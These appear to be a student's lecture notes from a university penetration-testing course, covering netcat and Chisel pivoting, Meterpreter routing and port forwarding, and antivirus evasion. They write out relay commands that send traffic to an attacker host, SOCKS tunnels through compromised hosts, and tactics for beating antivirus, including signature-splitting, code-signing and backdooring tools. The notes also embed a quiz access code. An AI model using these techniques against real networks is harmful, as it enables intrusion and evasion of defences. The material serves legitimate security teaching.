# MODULE 0x080 LECTURE 0x210 - PIVOTING WITH NETCAT

## What does netcat do?

* Simply, netcat relays its stdin through to a network (output) port...
    - ...and relays its network input through stdout

* When acting as a listener, it provides a service
    - e.g. `nc -lvnp 4444`

* When acting as a connector, it is a client of some service elsewhere
    - e.g. `nc <target IP> 4444`


## What if a service is not accessible on my network?

We can easily use netcat to connect to a service we can reach.

What if a server is behind a router and is not accesible from our kali host?
or...
What if the server has a firewall rule preventing our kali host from reaching it (but allows others to reach it)?

* If we can communicate with a host _that can communicate with the server,_ we can communicate with the server
    - A transitive property
    - __We can achieve this with netcat__


## Pivoting with two netcats

* On Linux systems, you can make a FIFO (named pipe) in the filesystem (for communication between two processes) using mknod:
    - `mknod name-of-file p`
    - Windows supports named pipes as well
    - With this, two processes can communicate by writing or reading from the file

* e.g. on a Linux host:
    - Create a FIFO such as `mknod /tmp/bp p` for "back pipe"
    - Then, combine a netcat listener and connector as such:
    - `nc <host-to-contact> 80 </tmp/bp | nc -l -p 4444 >/tmp/bp` (the FIFO is acting both as input to inaccessible host as well as output for our origin machine)
    - This allows us to pivot data through the netcat connection from one host to another.


## Blocked ports

Just as with Metasploit exploits, we may either...
- Not be able to open a connection to an arbitrary port on the pivot host, or
- Choose not to open a connection to the pivot host for reasons of stealth

* In that case, we must use an active connector to reach our attack host from the pivot host
    - In this case, we run `nc -l -p 80` on our attacker machine
    - Then, we run `nc <host-to-contact> 80 <tmp/bp | nc <attack-machine> 1337>/tmp/np`
    - Alternatively, we can run `nc <host-to-contact> 80 -c "nc <attack-machine> 1337"` (the `-c` option says "open up a back pipe and connect to a process")


## Traditional nc vs ncat and OpSec

Traditional nc suffers from exchanging information in cleartext. Why do we care?

* ncat is as much larger program than nc
    - __ncat supports SSL connections__

* e.g.
    - `-ncat --ssl host port`
    - `ncat --l --ssl port`
    - This would allow us to connect to a secure web server with netcat, for example.

* These versions use dynamically generated default certificates.
    - By default, no server verification is performed...
    - ...To be sure to connect to a correct server, use a well-known certificate on the server and use the `-v` option on the client to protect against MitM






# MODULE 0x080 LECTURE 0x220 - METASPLOIT PIVOTING

## ARP SCANNING IN A METERPRETER SESSION

If you have started a meterpreter session on a compromised host, you may be able to find other possible victims

* Useful commands in meterpreter:
    - `ipconfig` on Windows hosts
    - `shell` (then `ifconfig` or `ip a` on unix hosts)
    - `run arp_scanner [-r ip-range]` (on some meterpreter versions)


## Metasploit session control

* Meterpreter sessions can be backgrounded with `background`

* See available commands with `sessions`

* Sessions are numbered and you can bring a session back to the foreground with
    - `sessions -i [session_number]`


## Routing through a Meterpreter session

* You can identify the process the Meterpreter has exploited by using the following commands:
    - `ps`
    - `getpid`

* If the current exploited process is likely to terminate, you can attach a more long-lived process with:
    - `migrate pid`
    - May still get attached to another process that's about to die
    - You can only migrate to a process that you have write access to (e.g. if you are `NT AUTHORITY\SYSTEM`, then this means every process)

* One can add a route to a network through a backgrounded meterpreter session on a compromised host within that network with:
    - `route add ip-address netmask session#`
    - e.g. `route add 72.32.138.0 255.255.255.0 2`

* You can see the current routes with:
    - `routes print`
    - After setting that route, you can target any host on the routed network by specifying its IP address.
    - The exploti traffic will be routed through the compromised host


## Metasploit port scanning

* Can use `auxiliary/scanner/portscan/tcp`
    - Options allow control of scanning parameters
    - Can be very slow

* Options to set:
    - RHOSTS
    - RPORTS (ranges with dashes, commas, etc.)

* An alternative to that auxiliary is to establish a route to the network and use nmap to do such a scan


## Meterpeter port forwarding

A port forward allows you to automatically connect connections to a port on one machine to a port on another machine

* If you have a meterpreter session on a host in a remote network...
    - ...you can route a port on your local host to a port on any host in that remote machine's network thru your meterpreter session:
    - `portfwd add -l local-port# -p remote-port# -r remote-host-ip`

* This would allow, for example, attaching an smbclient connection to a remote (otherwise inaccessible) host by connecting to a port on your local host
    - e.g. in meterpreter, `portfwd add -l 8000 -p 445 -r 172.30.0.96`
    - Then, on your local host, run `smbclient -p 8000 //127.0.0.1/C$ -U user%password`






# MODULE 0x080 LECTURE 0x230 - ANTIVIRUS EVASION

## Antivirus techniques

AV programs try to identify malware. Techniques vary.

Lenny Zeltser (author of SANS Malware Reverse Engineering course) identifies __three underlying approaches:__
1. Signature detection (specific sequence of bytes)
2. Heuristic detection (attributes of the file as a whole such as entropy or other properties)
3. Behavioral detection (run the program and see if it does something suspicious) -- typically done in a sandboxed environment


## Negative outcomes to pentesters

Scenario:

- Generate a meterpreter executable
- Get it to host via a remote mount
- Try to execute it
- FAIL

### QUIZ ACCESS CODE
Snarky Puppy - Lingus (We Like It Here)


## Changing AV landscape

In 2008, meterpreter.exe was recognized by recognized by __3 of 32 antivirus products.__

* Use of encoders (`show encoders` in metasploit) would help.
    - Shikata ga nai encoder would evade 100% of AV products -- "it can't be helped"

* By 2013, 42 of 45 AV products would recognize the default metasploit template with no payload embedded in it.
    - Even with no payload! It just recognized the code that metasploit would send to run one eventually.

* This cat-and-mouse game continues all the time.
    - You need to understand how it works to avoid being caught


## Finding the signature

Typically, only a few bytes in a file may compromise the signature that most AV products will identify.

* You can use the _wolf-fence method_
    - e.g. binary search to identify the offending code or data -- what you would use if you didn't know how to use a debugger
    - A tool for assisting with this in the context of AV signature matching is [dsplit](https://github.com/rzwck/pydsplit)
    - Once the offending bytes are found, you identify a work-around and employ this new miraculous program instead of the original.


## AV bypass methods

### Encoders
MSF encoders, msfvenom, packers (UPX, etc.)...

### Ghost writers
Command substitution, custom metasploit stagers...

### Payload scripts with interpreters


## You only need to defeat your client's AV!

If you know what AV your client is using (ask, btw.):
- Install it on your system
- Craft payloads to bypass _that_ AV
- Profit


## If you still want to encode

Use of default exe template will likely fail.

* There are a few others (exe-small, exe-service, exe-only, vba-exe) that may evade AV.
* Multiple encodings (`-i` parameter to generate) rarely help
* Purchase a code signing certificate
    - Reduces rejection rate by factor of 4, according to a [2013 study](https://memeover.arkem.org/2013/11/authenticode-and-antivirus-detection.html)


## Ghost writing tools are available

These are things that can turn a legitimate executable into one that has "extra functionality" unintended by original devs.

* [Hyperion by Null Security](https://nullsecurity.net/tools/binary.html)
    - Last updated March 2020
* [Shellter](https://www.shellterproject.com/)
    - Active project
* [Backdoor factory](https://github.com/secretsquirrel/the-backdoor-factory)
    - Josh Pitts, UF alum. No longer supported.
* Astrobaby's generator
    - Dark web thing? How do you get account? Idk
* [Metasm](https://github.com/jjyg/metasm)
    - Older tool, may or may not be useful


## Using payload scripts

* [Pyinjector](https://github.com/kmaork/pyinjector)
    - Inject shared libraries into running processes
* [Veil](https://github.com/Veil-Framework/Veil)
    - Tool designed to generate metasploit payloads that bypass common anti-virus solutions.





# MODULE 0x080 LECTURE 0x210 - PIVOTING WITH NETCAT

Chisel lets you tunnel TCP __and__ UDP connections from one host to another.

* It helps pass communications through firewalls
* Uses HTTP with SSH to encrypt communications __by default__
* Developed in go and can be ported to many different OS/architecture combinations (highly portable)

[Click here for github repo](https://github.com/jpillora/chisel)

* Sidenote on ICMP forwarding:
    - ICMP packets may or may not be forwarded (use the `-Pn` option in nmap?)


## Chisel tunnelling capabilities

Chisel supports two principal types of tunnelling:
1. Port forwarding
2. Proxying

* We are familiar with port forwarding by now

* A SOCKet Secure (SOCKS) proxy server allows a client in another network to connect to the server
    - Once a client is connected, a process on the server can request that all of its network traffic should be forwarded to the client's network and then released on the network
    - That effectively establishes a tunnel through which any network connection from a process to an endpoint (SOCKS client) and then released on the network at that point.
    - Any routing that happens after that happens from the client machine, not from the server.


## Proxychains

Linux program (available on other OSs tho) that uses a local SOCKS proxy to tunnel a program's network communication.

* You can run a program with proxychains and its network connections will be forwarded through the tunnel

* It uses a configuration file (usually in `/etc/`)
    - You can override it using the `-f file` option
    - `-q` option avoids sending log information to the console (this program can be very noisy, e.g. using nmap)

* One runs proxychains as `proxchains [-f file] [-q] program [arguments]` to tunnel the specified program's network activity.


## Using Chisel to evade a firewall

In this case, you are an attacker trying to __communicate through a compromised victim__ machine.

You can run a chisel servere on the attack host and a chisel client on the victim host.

* Chisel __server__ arguments of interest are:
    - `server`: tell chisel you are running in server mode
    - `-p ####`: tell chisel what server port to open for client connections
    - `--reverse`: allow the client to specify a server port to forward
    - `--socks5`: allows client to request SOCKS5 proxying

* Chisel __client__ arguments of interest are:
    - `client`: tell chisel you are running in client mode
    - `host:port`: identifies the host and port whose chisel server you want to contact
    - `R:fwd-port:target-host:target-port`: directs the server to forward a port to a target-host port
    - `R:socks:` allow the server to SOCKS5 proxy processes on your network on the default socks port by chisel
    - `R:port:socks`: Specify SOCKS5 proxying through a non-default socks5 server-port


## Chisel demo

In this demo, we are shown how to use a chisel server and client together to enable both proxying and port-forwarding.
- The server is `fac2.cise.ufl.edu` and the client is a kali machine with IP `172.24.0.10`
- Can't get from fac2 to kali, but __can__ get from kali to fac2.
- On fac2, we have chisel, along with copies of chisel, proxychains, proxychains config file, and libproxychains.so.4


The `tail` output of proxychains config:
```
...
[ProxyList]
## add proxy here ...
## meanwhile
## defaults set to
socks5 127.0.0.1 9050
## socks4 127.0.0.1 9050
```

* Now, on fac2:
    - `./chisel server -p 8000 --reverse --socks5`

* Then, on kali machine:
    - `./chisel client fac2.cise.ufl.edu:8000 R:9050:socks`

* Now we get a message on fac2 machine that we connected from the kali host
    - Background process with Ctrl+Z
    - `bg` to show that it is there
    - Now, `./proxychains -f proxychains.conf ssh kali@172.24.0.10`

* We now have contact from fac2 to kali!

* On kali:
    - `jobs`
    - `kill %1`
    - `./chisel client fac2.cise.ufl.edu:8000 R:9000:localhost:22`

* Then, on fac2:
    - `ssh -p 9000 kali@localhost`

* We onec again have contact from fac2 to kali!

END MODULE 0x080
